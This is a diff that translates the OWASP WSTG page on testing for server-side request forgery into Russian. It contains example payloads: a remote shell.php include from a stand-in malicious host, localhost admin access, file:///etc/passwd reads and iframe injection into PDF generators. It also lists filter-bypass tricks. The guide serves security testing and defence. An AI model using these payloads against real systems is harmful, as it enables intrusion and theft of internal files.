@@ -13,67 +13,67 @@ tags: WSTG
 |------------|
 |WSTG-INPV-19|
 
-## Summary
+## Обзор
 
-Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).
+Web-приложения часто взаимодействуют с внутренними или внешними ресурсами. Хотя вы можете ожидать, что обрабатывать отправляемые вами данные будет только предназначенный для этого ресурс, неправильно обработанные данные могут создать ситуацию, в которой возможны атаки путём инъекции. Одним из видов инъекций является подделка запросов на стороне сервера (SSRF). Успешная атака SSRF может предоставить злоумышленнику доступ к ограниченным действиям, внутренним службам или внутренним файлам в приложении или организации. В некоторых случаях это даже может привести к удалённому выполнению кода (RCE).
 
-## Test Objectives
+## Задачи тестирования
 
-- Identify SSRF injection points.
-- Test if the injection points are exploitable.
-- Asses the severity of the vulnerability.
+- Найти точки для инъекции SSRF.
+- Протестировать, пригодны ли эти точки для эксплуатации.
+- Оцените воздействие уязвимости.
 
-## How to Test
+## Как тестировать
 
-When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.
+При тестировании на SSRF вы пытаетесь заставить целевой сервер непреднамеренно загружать или сохранять содержимое, которое может быть вредоносным. Самый распространённый тест — локальное и удаленное включение файлов. Есть ещё один аспект SSRF: доверительные отношения, которые часто возникают, когда сервер приложений может взаимодействовать с другими бэкенд-серверами, недоступными для пользователей напрямую. Эти бэкенд-серверы часто имеют немаршрутизируемые частные IP-адреса или ограничены определёнными хостами. Поскольку они защищены топологией сети, им часто не хватает более сложных элементов управления. Эти внутренние системы часто содержат конфиденциальные данные или функции.
 
-Consider the following request:
+Рассмотрите следующий запрос:
 
 ``` http
 GET https://example.com/page?page=about.php
 ```
 
-You can test this request with the following payloads.
+Вы можете протестировать этот запрос со следующими полезными нагрузками.
 
-### Load the Contents of a File
+### Загрузить содержимое файла
 
 ```http
 GET https://example.com/page?page=https://malicioussite.com/shell.php
 ```
 
-### Access a Restricted Page
+### Обратиться к странице с ограниченным доступом
 
 ```http
 GET https://example.com/page?page=http://localhost/admin
 ```
 
-Or:
+Или:
 
 ```http
 GET https://example.com/page?page=http://127.0.0.1/admin
 ```
 
-Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.
+Используйте интерфейс обратной связи для доступа к контенту, доступ к которому ограничен только хостом. Этот механизм подразумевает, что если у вас есть доступ к хосту, у вас также есть привилегии для прямого доступа к странице `admin`.
 
-These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.
+Такого рода доверительные отношения, при которых запросы, исходящие с локального компьютера, обрабатываются иначе, чем все остальные, часто делают SSRF критической уязвимостью.
 
-### Fetch a Local File
+### Извлечь локальный файл
 
 ```http
 GET https://example.com/page?page=file:///etc/passwd
 ```
 
-### HTTP Methods Used
+### Используемые HTTP-методы
 
-All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
+Все приведенные выше полезные данные могут применяться к любому типу HTTP-запроса, а также могут быть вставлены в значения заголовков и cookie.
 
-One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.
+Одно важное замечание относительно SSRF с POST-запросами заключается в том, что SSRF также может проявляться вслепую, потому что приложение может сразу ничего и не выдавать. Вместо этого введённые данные могут использоваться в других функциях, таких как отчёты в формате PDF, обработка счетов-фактур или заказов и т.д., которые могут быть видны сотрудникам или персоналу, но не обязательно конечному пользователю или тестировщику.
 
-You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).
+Узнать больше о слепом SSRF можно [здесь](https://portswigger.net/web-security/ssrf/blind), или в [разделе ссылок](#ссылки).
 
-### PDF Generators
+### Генераторы PDF
 
-In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
+В некоторых случаях сервер может конвертировать загруженные файлы в формат PDF. Попробуйте вставить элементы `<iframe>`, `<img>`, `<base>` или `<script>` или функцию CSS `url()`, указывающие на внутренние службы.
 
 ```html
 <iframe src="file:///etc/passwd" width="400" height="400">
@@ -82,30 +82,30 @@ In some cases, a server may convert uploaded files to PDF format. Try injecting 
 
 ### Распространённые пути обхода фильтра
 
-Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:
+Некоторые приложения блокируют ссылки на `localhost` и `127.0.0.1`. Это можно обойти с помощью:
 
-- Using alternative IP representation that evaluate to `127.0.0.1`:
-    - Decimal notation: `2130706433`
-    - Octal notation: `017700000001`
-    - IP shortening: `127.1`
-- String obfuscation
-- Registering your own domain that resolves to `127.0.0.1`
+- Использование альтернативного представления IP-адреса, которое эквивалентно `127.0.0.1`:
+    - Десятичное: `2130706433`
+    - Восьмеричное: `017700000001`
+    - Сокращённая запись IP: `127.1`
+- Обфускация строк
+- Регистрация собственного домена, который разрешается в `127.0.0.1`
 
-Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).
+Иногда приложение допускает ввод, соответствующий только определённому выражению, например домену. Это можно обойти, если неправильно реализован парсер схемы URL, что может привести к следующим [семантическим атакам](https://datatracker.ietf.org/doc/html/rfc3986#section-7.6):
 
-- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
-- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
-- URL encoding
-- Fuzzing
-- Combinations of all of the above
+- использованию символа `@` для разделения информации о пользователе и хосте: `https://expected-domain@attacker-domain`;
+- URL-фрагменты с помощью символа `#`: `https://attacker-domain#expected-domain`;
+- URL-кодировка;
+- фаззинг;
+- сочетания из всего вышеперечисленного.
 
-For additional payloads and bypass techniques, see the [references](#references) section.
+Дополнительные полезные нагрузки и методы обхода см. в разделе [Ссылки](#ссылки).
 
-## Remediation
+## Как исправить
 
-SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+Известно, что SSRF — одна из самых сложных атак, которую невозможно отразить без использования «белых» списков, требующих указания конкретных IP- и URL-адресов. Подробнее о защите от SSRF см. в [Памятке по предотвращению подделки запросов на стороне сервера](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
-## References
+## Ссылки
 
 - [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
 - [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
@@ -113,7 +113,7 @@ SSRF is known to be one of the hardest attacks to defeat without the use of allo
 - [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
 - [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
 - [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
-- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
-- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
+- [Bugcrowd: SSRF](https://www.bugcrowd.com/glossary/server-side-request-forgery-ssrf/)
+- [Hackerone Blog: SSRF](https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf)
 - [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
-- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)
+- [Общий синтаксис URI](https://datatracker.ietf.org/doc/html/rfc3986)
